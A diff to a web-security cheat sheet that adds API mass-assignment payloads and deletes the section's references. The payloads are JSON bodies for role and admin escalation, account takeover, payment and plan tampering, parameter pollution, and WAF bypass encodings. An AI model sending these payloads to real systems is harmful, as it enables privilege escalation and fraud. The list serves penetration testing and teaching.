@@ -2571,12 +2571,227 @@ If the web application is not checking which parameters are allowed to be update
 * [PentesterAcademy - Mass Assignment II](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1922)
 * [Root Me - API - Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)
 
+# 🔹 Basic API Mass Assignment Payloads
+a
+* Simple role escalation (JSON):  `{"role":"admin"}` → Adds hidden role field in API request.
+* Admin flag injection:  `{"isAdmin":true}` → Gains elevated privileges.
+* Access level override:  {"access_level":999}` → Maximum permission.
+* User type switch:  `{"user_type":"admin"}`
+* Boolean privilege abuse:  `{"admin":1}`
 
-## References
+# 🔹 REST API Object Injection
 
-- [Hunting for Mass Assignment - Shivam Bathla - August 12, 2021](https://blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda)
-- [Mass Assignment Cheat Sheet - OWASP - March 15, 2021](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
-- [What is Mass Assignment? Attacks and Security Tips - Yoan MONTOYA - June 15, 2023](https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/)
+* Full object overwrite:
+  ```json
+  {
+    "user":{
+      "role":"admin",
+      "id":1
+    }
+  }
+  ```
+* Nested privilege injection:
+  ```json
+  {
+    "profile":{
+      "settings":{
+        "isAdmin":true
+      }
+    }
+  }
+  ```
+* Hidden field inclusion:
+  ```json
+  {
+    "email":"user@test.com",
+    "verified":true
+  }
+  ```
+# 🔹 PUT / PATCH Abuse (Full Object Update)
+* Replace entire object:
+  ```json
+  {
+    "id":1,
+    "role":"admin",
+    "permissions":"all"
+  }
+  ```
+* Partial update abuse:
+  ```json
+  {
+    "role":"admin"
+  }
+  ```
+* Add unauthorized field:
+  ```json
+  {
+    "internal":true
+  }
+  ```
+# 🔹 Account Takeover via API
+
+* ID override:
+  ```json
+  {"user_id":1}
+  ```
+* Owner change:
+  ```json
+  {"owner_id":1}
+  ```
+* Email takeover:
+  ```json
+  {"email":"attacker@evil.com"}
+  ```
+* Username impersonation:
+  ```json
+  {"username":"admin"}
+  ```
+
+# 🔹 Bulk API Abuse
+
+* Batch update:
+  ```json
+  {
+    "users":[
+      {"id":1,"role":"admin"},
+      {"id":2,"role":"admin"}
+    ]
+  }
+  ```
+* Mass privilege escalation:
+  ```json
+  {
+    "accounts":[{"access_level":999}]
+  }
+  ```
+# 🔹 Business Logic Manipulation (API)
+
+* Payment tampering:
+  ```json
+  {"amount":1}
+  ```
+* Discount abuse:
+  ```json
+  {"discount":100}
+  ```
+* Plan upgrade:
+  ```json
+  {"plan":"enterprise"}
+  ```
+* Order manipulation:
+  ```json
+  {"status":"completed"}
+  ```
+
+# 🔹 JSON Parameter Pollution (API)
+
+* Duplicate key override:
+  ```json
+  {"role":"user","role":"admin"}
+  ```
+
+* Array confusion:
+  ```json
+  {"role":["user","admin"]}
+  ```
+
+* Null override:
+  ```json
+  {"role":null,"role":"admin"}
+  ```
+
+* Boolean conflict:
+  ```json
+  {"isAdmin":false,"isAdmin":true}
+  ```
+
+# 🔹 Advanced API Object Tricks
+
+* Metadata injection:
+  ```json
+  {"meta":{"role":"admin"}}
+  ```
+* Config override:
+  ```json
+  {"config":{"debug":true}}
+  ```
+* Dot notation:
+  ```json
+  {"user.role":"admin"}
+  ```
+* Prototype style:
+  ```json
+  {"__proto__":{"admin":true}}
+  ```
+
+# 🔹 Content-Type Based Bypass
+
+* JSON as text:  
+  `Content-Type: text/plain`  
+  → Backend still parses JSON.
+
+* Form instead of JSON:  
+  `role=admin&isAdmin=true`
+
+* Multipart request:
+  ```
+  Content-Type: multipart/form-data
+  role=admin
+  ```
+
+# 🔹 WAF Bypass Techniques (API Mass Assignment)
+
+## 🧩 Encoding Tricks
+
+* URL encoding:    `%72%6f%6c%65=admin`
+* Double encoding:    `%2572%256f%256c%2565=admin`
+* Unicode encoding: 
+  ```json
+  {"r\u006fle":"admin"}
+  ```
+
+## 🧩 Case Variation
+
+* Mixed case keys:
+  ```json
+  {"RoLe":"AdMiN"}
+  ```
+
+* Uppercase keys:
+  ```json
+  {"ROLE":"ADMIN"}
+  ```
+
+## 🧩 Nested Structure Bypass
+
+* Deep nesting:
+  ```json
+  {"data":{"user":{"role":"admin"}}}
+  ```
+
+* Wrapper bypass:
+  ```json
+  {"payload":{"role":"admin"}}
+  ```
+
+## 🧩 Duplicate Override
+
+* Multi-layer override:
+  ```json
+  {"role":"user","data":{"role":"admin"}}
+  ```
+
+## 🧩 Field Explosion
+
+* Many fields injected:
+  ```json
+  {
+    "role":"admin",
+    "isAdmin":true,
+    "access":999,
+    "permissions":"all"
+  }
+  ```
 - -------------
 ## Web Cache Deception Attack
 
